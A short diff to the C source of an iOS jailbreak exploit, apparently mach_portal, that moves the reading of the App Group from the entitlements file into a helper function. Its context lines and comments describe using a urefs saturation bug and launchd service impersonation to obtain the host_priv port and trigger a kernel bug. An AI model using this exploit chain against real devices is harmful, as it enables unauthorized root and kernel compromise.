@@ -13,24 +13,21 @@
 #include "unsandboxer.h"
 #include "offsets.h"
 #include "kernel_memory_helpers.h"
+#include "AppGroup.h"
 
 int jb_go() {
   // do platform detection
   init_offsets();
   
   // dynamically get the App Group from bundled entitlement file
-  id bundle = objc_msgSend((id)objc_getClass("NSBundle"), sel_registerName("mainBundle"));
-  id path = objc_msgSend(bundle, sel_registerName("pathForResource:ofType:"), CFSTR("mach_portal"), CFSTR("entitlements"));
-  id dict = objc_msgSend(objc_msgSend((id)objc_getClass("NSDictionary"), sel_registerName("alloc")), sel_registerName("initWithContentsOfFile:"), path);
-  id array = objc_msgSend(dict, sel_registerName("objectForKey:"), CFSTR("com.apple.security.application-groups"));
-  id suiteName = objc_msgSend(array, sel_registerName("firstObject"));
-  char * app_group = (char *)objc_msgSend(suiteName, sel_registerName("UTF8String"));
+  char * app_group = copyAppGroup();
   
   // exploit the urefs saturation bug; target launchd to impersonate a service
   // and get the task port for a root service and use that to get the host_priv port
   // which we need to trigger the kernel bug
   mach_port_t real_service_port, mitm_port;
   mach_port_t host_priv_port = get_host_priv_port(app_group, &real_service_port, &mitm_port);
+  free(app_group);
   
   if (host_priv_port == MACH_PORT_NULL) {
     printf("[-] getting host priv port failed :-( \n");
